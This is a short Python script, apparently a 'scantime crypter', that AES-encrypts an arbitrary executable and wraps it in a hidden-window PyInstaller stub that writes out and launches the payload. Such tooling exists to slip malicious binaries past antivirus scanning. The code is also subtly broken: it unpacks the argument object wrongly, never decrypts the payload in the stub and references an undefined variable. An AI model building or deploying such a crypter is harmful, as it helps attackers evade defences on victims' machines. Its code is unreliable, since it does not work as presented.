import pyaes
import os
import subprocess
from time import sleep
from argparse import ArgumentParser
from os import urandom

parser = ArgumentParser('Scantime Crypter')
parser.add_argument('-b', '--binary', type=str, required=True, help='Binary to encrypt')
parser.add_argument('-o', '--output-binary-name', type=str, required=True, help='Name to te encrypted binary')
args = parser.parse_args()

key = urandom(16)

binary, output_binary = args

with open(binary, 'rb') as binary:
    bin_content = binary.read()

encrypted_data = pyaes.AESModeOfOperationCTR(key).encrypt(bin_content)

stub = f"""
import pyaes
import subprocess

key = {key}
output_binary_name = '{output_binary}'

encrypted_data = {encrypted_data}

with open(output_binary_name, 'wb') as binary:
    file.write(encrypted_data)

subprocess.Popen(output_binary_name)
"""

with open('stub.py', 'w') as stub_file:
    stub_file.write(stub)

os.system('pyinstaller -F -w --clean stub.py')
sleep(60)
subprocess.Popen('stub.exe')